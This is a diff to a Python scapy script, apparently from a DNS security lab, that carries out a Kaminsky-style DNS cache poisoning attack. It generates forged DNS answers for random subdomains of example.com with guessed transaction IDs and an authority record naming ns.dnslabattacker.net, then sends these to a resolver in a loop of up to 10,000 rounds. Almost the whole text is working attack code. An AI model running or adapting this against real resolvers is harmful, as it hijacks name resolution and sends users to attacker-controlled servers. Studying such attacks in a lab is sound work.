@@ -56,12 +56,12 @@ def exampleSendDNSQuery():
 
 def genPoisonedPacket(fake,rand):
     serverName = "example.com"
-    packet = (DNS(id=rand,qr=1,rd=1,nscount=1,ancount=1,
-        qd=scapy.all.DNSQR(qname=serverName),
-        an=scapy.all.DNSRR(rrname=serverName,type="A",rdata="1.2.3.4",ttl=92300),
+    DNS_portion = (DNS(id=rand,qr=1,rd=1,ra=1,aa=1,nscount=1,ancount=1,
+        qd=scapy.all.DNSQR(qname=fake),
+        an=scapy.all.DNSRR(rrname=fake,type="A",rdata="1.2.3.4",ttl=92300),
         ns=scapy.all.DNSRR(rrname=serverName,type="NS",rdata="ns.dnslabattacker.net",ttl=93400)
         ))
-
+    packet = DNS_portion
     #packet.show()
     return packet
 
@@ -69,38 +69,44 @@ def sendBadDNSQuery():
     fakeName = getRandomSubDomain()+'.example.com'
 
     packetList = []
-    for i in xrange(0,200):
+    for i in xrange(0,78):
         packetList.append(genPoisonedPacket(fakeName, getRandomTXID()))
-
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakeName))
     sendPacket(sock, dnsPacket, my_ip, my_port)
 
-    """
-    sock.setblocking(False)
-    while True:
-        data = sock.recv(4096)
-        if not data:
-            sendPacket(sock, genPoisonedPacket(fakeName, getRandomTXID()), my_ip, my_port)
-        else:
-            break
-    """
-    for i in xrange(0,199):
-        sendPacket(sock, packetList[i], my_ip, my_port)
+    for i in xrange(0,77):
+        sendPacket(sock, packetList[i], my_ip, my_query_port)
 
     response = sock.recv(4096)
     response = DNS(response)
-    """
-    print "\n***** Packet Received from Remote Server *****"
-    response.show()
-    print "***** End of Remote Server Packet *****\n"
-    """
 
 def attack():
-    for i in xrange(0,200):
+    for i in xrange(0,10000):
         sendBadDNSQuery()
+
+def testSpeed():
+    fakeName = "example.com"
+    packetList = []
+    for i in xrange(0,78):
+        packetList.append(DNS(rd=1, qd=DNSQR(qname=fakeName)))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    for i in xrange(0,77):
+        sendPacket(sock, packetList[i], my_ip, my_port)
+
+def getPacketInfo():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname="example.com"))
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+    response = sock.recv(4096)
+    response = DNS(response)
+    response.show()
 
 if __name__ == '__main__':
     attack()
+    #getPacketInfo()
+    #testSpeed()
     #exampleSendDNSQuery()
+    #packet = genPoisonedPacket("123.example.com",getRandomTXID())
+    #packet.show2()
